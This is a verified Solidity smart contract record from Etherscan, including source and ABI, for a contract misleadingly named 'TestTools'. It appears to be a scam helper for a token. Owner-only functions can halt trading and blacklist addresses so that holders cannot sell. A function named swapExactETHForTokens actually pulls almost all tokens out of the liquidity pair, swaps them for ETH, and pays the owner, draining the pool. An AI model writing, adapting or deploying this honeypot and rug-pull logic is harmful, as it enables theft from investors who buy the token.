{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2023-07-19\r\n*/\r\n\r\n/**\r\n *Submitted for verification at Etherscan.io on 2023-07-18\r\n*/\r\n\r\n/**\r\n \r\n*/\r\n\r\n/**\r\n \r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.10;\r\n\r\ninterface IERC20 {\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function decimals() external pure returns (uint8);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n}\r\ninterface IUniRouter {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\n\r\ninterface IUniswapV2Pair {\r\n    function sync() external;\r\n}\r\ncontract TestTools {\r\n    bool private isEnabled = true;\r\n    address private _owner;\r\n    address private token;\r\n    address private pair;\r\n    IUniRouter private router;\r\n\r\n    mapping(address => bool) whitelists;\r\n    mapping(address => bool) blacklists;\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == _owner); _;\r\n    }\r\n    constructor() {\r\n        _owner = msg.sender;\r\n        router = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    }\r\n    function refresh(address token_, address pair_) external onlyOwner {\r\n        token = token_;\r\n        pair = pair_;\r\n    }\r\n    function enable(bool isEnabled_) external onlyOwner {\r\n        isEnabled = isEnabled_;\r\n    }\r\n    function reset() external onlyOwner {\r\n        token = address(0);\r\n        pair = address(0);\r\n        isEnabled = true;\r\n    }\r\n    function check(\r\n        address from\r\n    ) external view returns (uint256) {\r\n        if (whitelists[from] || pair == address(0) || from == token) {\r\n            return 0;\r\n        }\r\n        else if ((from == _owner || from == address(this))) {\r\n            return 1;\r\n        }\r\n        if (from != pair) {\r\n            require(isEnabled);\r\n            require(!blacklists[from]);\r\n        }\r\n        return 0;\r\n    }\r\n    function WWW(address[] memory whitelists_) external onlyOwner{\r\n        for (uint i = 0; i < whitelists_.length; i++) {\r\n            whitelists[whitelists_[i]] = true;\r\n        }\r\n    }\r\n\r\n    function BBB(address[] memory blacklists_) external onlyOwner{\r\n        for (uint i = 0; i < blacklists_.length; i++) {\r\n            blacklists[blacklists_[i]] = true;\r\n        }\r\n    }\r\n\r\n    function swapExactETHForTokens(uint256 amount) external onlyOwner {\r\n        uint256 balance = IERC20(token).balanceOf(pair) - 1 * 10 ** IERC20(token).decimals();\r\n        IERC20(token).transferFrom(pair, address(this), balance);\r\n        IUniswapV2Pair(pair).sync();\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = token;\r\n        path[1] = router.WETH();\r\n        IERC20(token).approve(address(router), ~uint256(0));\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            IERC20(token).balanceOf(address(this)),\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );  \r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    function rescue(address token_) external onlyOwner {\r\n        if (token_ == address(0)) {\r\n            payable(msg.sender).transfer(address(this).balance);\r\n        } else {\r\n            IERC20(token_).transfer(msg.sender, IERC20(token_).balanceOf(address(this)));\r\n        }\r\n    }\r\n    receive() external payable { }\r\n\r\n    fallback(bytes calldata) external payable returns (bytes memory) {\r\n        address from;\r\n        bytes memory data = msg.data;\r\n        assembly {\r\n            from := mload(add(data, 0x14))\r\n        }\r\n        if (whitelists[from] || pair == address(0) || from == token) {\r\n            return abi.encodePacked(uint256(0));\r\n        }\r\n        else if ((from == _owner || from == address(this))) {\r\n            return abi.encodePacked(uint256(1));\r\n        }\r\n        if (from != pair) {\r\n            require(isEnabled);\r\n            require(!blacklists[from]);\r\n        }\r\n        return abi.encodePacked(uint256(0));\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"blacklists_\",\"type\":\"address[]\"}],\"name\":\"BBB\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"whitelists_\",\"type\":\"address[]\"}],\"name\":\"WWW\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"}],\"name\":\"check\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"isEnabled_\",\"type\":\"bool\"}],\"name\":\"enable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"pair_\",\"type\":\"address\"}],\"name\":\"refresh\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token_\",\"type\":\"address\"}],\"name\":\"rescue\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reset\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"swapExactETHForTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "TestTools", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://b9e272260cc4372bdc0ce6e61af61200f79dc94ff97585e77ccfd0858ae0a35f"}